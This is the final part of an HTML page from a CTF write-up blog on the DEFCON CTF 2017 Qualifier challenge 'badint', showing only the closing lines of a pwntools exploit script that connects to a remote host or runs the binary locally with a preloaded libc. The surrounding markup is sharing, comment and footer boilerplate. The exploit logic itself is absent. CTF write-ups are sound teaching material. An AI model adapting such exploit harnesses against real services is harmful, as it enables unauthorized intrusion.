		<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
		<span class="n">exploit</span><span class="p">()</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./badint"</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span> <span class="p">:</span> <span class="s">"./libc.so"</span><span class="p">})</span>

		<span class="k">print</span> <span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
		<span class="n">pause</span><span class="p">()</span>
		<span class="n">exploit</span><span class="p">()</span>
    </code></pre></figure>


    <aside class="share">

      <span>Share this: </span>

      <a href="http://twitter.com/share?text=DEFCON CTF 2017 Qualifier - badint&amp;url=https://kileak.github.io/ctf/2017/DefconQual-BadInt/"
      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <i class="icon icon-twitter-rounded"></i>
      </a>

      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2017/DefconQual-BadInt/"
      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <i class="icon icon-facebook-rounded"></i>
      </a>

    </aside>
  </div>

  
  <hr>
  <aside id="comments" class="disqus">
    <div class="container">
      <h3><i class="icon icon-comments-o"></i> Comments</h3>
      <div id="disqus_thread"></div>

      <script type="text/javascript">
        var disqus_shortname = 'kileak';
        var disqus_identifier = '/ctf/2017/DefconQual-BadInt';
        var disqus_title = 'DEFCON CTF 2017 Qualifier - badint';
        var disqus_url = 'https://kileak.github.io/ctf/2017/DefconQual-BadInt';

        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>

      <noscript>
        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
      </noscript>
    </div>
  </aside>



</article>

        </section>

        
<div class="clearfix"></div>

<footer class="site-footer txt-center">
  <hr>

  <ul class="social">
    
  </ul>

  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>

</footer>


    </main>

    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

    <script src="/js/jquery.min.js"></script>
    <script src="/js/jekyll-search.min.js"></script>
    <script src="/js/main.js"></script>
  </body>
</html>
